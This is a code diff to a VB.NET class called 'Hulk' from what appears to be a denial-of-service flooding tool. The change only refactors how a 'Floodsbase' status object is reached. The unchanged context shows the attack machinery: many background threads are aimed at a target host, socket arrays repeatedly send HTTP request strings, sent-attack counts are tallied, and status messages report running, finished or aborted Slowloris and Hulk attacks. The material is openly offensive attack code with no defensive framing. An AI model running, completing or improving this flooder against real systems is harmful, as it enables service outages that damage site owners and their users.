@@ -13,10 +13,8 @@ Public Class Hulk
     Private Threads As Thread()
     Private AttackRunning As Boolean = False
     Private Attacks As Integer = 0
-    Private _Floodsbase As Floodsbase
     Private RandomFile As Boolean
-    Public Sub New(ByVal model As HulkModel, ByVal Floodsbase As Floodsbase)
-        _Floodsbase = Floodsbase
+    Public Sub New(ByVal model As HulkModel)
         If Not AttackRunning = True Then
             AttackRunning = True
             HostToAttack = model.Host
@@ -32,7 +30,7 @@ Public Class Hulk
 
 
             Threads = New Thread(ThreadstoUse - 1) {}
-            _Floodsbase.SetMessage("Hulk attack")
+            GetFloodsBase().SetMessage("Hulk attack")
             For i As Integer = 0 To ThreadstoUse - 1
                 Threads(i) = New Thread(AddressOf DoWork)
                 Threads(i).IsBackground = True
@@ -40,7 +38,7 @@ Public Class Hulk
             Next
 
         Else
-            _Floodsbase.SetMessage("A Slowloris Attack is Already Running on " & HostToAttack)
+            GetFloodsBase().SetMessage("A Slowloris Attack is Already Running on " & HostToAttack)
         End If
 
     End Sub
@@ -51,7 +49,7 @@ Public Class Hulk
             ThreadsEnded = 0
             ThreadstoUse = 0
             AttackRunning = False
-            _Floodsbase.SetMessage("Slowloris Attack on " & HostToAttack & " finished successfully. Attacks Sent: " & Attacks.ToString)
+            GetFloodsBase().SetMessage("Slowloris Attack on " & HostToAttack & " finished successfully. Attacks Sent: " & Attacks.ToString)
             Attacks = 0
 
         End If
@@ -67,11 +65,11 @@ Public Class Hulk
                 End Try
             Next
             AttackRunning = False
-            _Floodsbase.SetMessage("Slowloris Attack on " & HostToAttack & " aborted successfully. Attacks Sent: " & Attacks.ToString)
+            GetFloodsBase().SetMessage("Slowloris Attack on " & HostToAttack & " aborted successfully. Attacks Sent: " & Attacks.ToString)
             Attacks = 0
 
         Else
-            _Floodsbase.SetMessage("No Slowloris Attack is Running!")
+            GetFloodsBase().SetMessage("No Slowloris Attack is Running!")
         End If
     End Sub
     Private Function headers()
@@ -142,7 +140,7 @@ Public Class Hulk
                         socketArray(i).Send(ASCIIEncoding.Default.GetBytes(HttpString), SocketFlags.None)
 
                         Attacks = Attacks + 1
-                        _Floodsbase.Set_AttackUpStrengOnByte(Attacks * HttpString.Length)
+                        GetFloodsBase().Set_AttackUpStrengOnByte(Attacks * HttpString.Length)
 
                     Next i
                     Dim j As Integer
@@ -156,7 +154,7 @@ Public Class Hulk
                             sb.Append(Encoding.ASCII.GetString(bytesReceived, 0, bytes))
                         Loop Until bytes > 0
 
-                        _Floodsbase.Set_AttackDownStrengOnByte(Attacks * sb.ToString().Length)
+                        GetFloodsBase().Set_AttackDownStrengOnByte(Attacks * sb.ToString().Length)
                         socketArray(j).Close()
                     Next j
                     Continue Do
